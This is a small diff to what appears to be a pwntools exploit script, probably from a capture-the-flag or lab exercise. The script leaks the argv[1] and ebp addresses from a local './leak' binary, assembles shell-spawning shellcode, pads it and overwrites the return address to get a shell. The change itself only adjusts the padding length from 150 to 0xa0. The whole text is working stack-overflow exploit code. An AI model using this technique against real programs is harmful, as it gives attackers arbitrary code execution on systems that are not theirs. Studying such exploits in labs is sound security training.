@@ -31,7 +31,7 @@ def run_binary(binary, s=''):
     return shell.run(cmd)
 
 # leak the address of argv1 and ebp in main function.
-output = run_binary('./leak', NOPS(150)).recvall().split('\n')
+output = run_binary('./leak', NOPS(0xa0)).recvall().split('\n')
 addr = int(output[0], 16)
 ebp = int(output[1], 16)
 log.success('Get argv[1] addr: %#x' % addr)
@@ -41,7 +41,7 @@ payload = asm(shellcraft.sh())
 payload = RIGHT_PAD(payload, 128 + (ebp & 0xf) + 4)
 payload += p32(addr)
 # in order to keep the stack, pad the payload to 150
-payload = RIGHT_PAD(payload, 150)
+payload = RIGHT_PAD(payload, 0xa0)
 io = run_binary(bin_path, payload)
 io.clean()
 
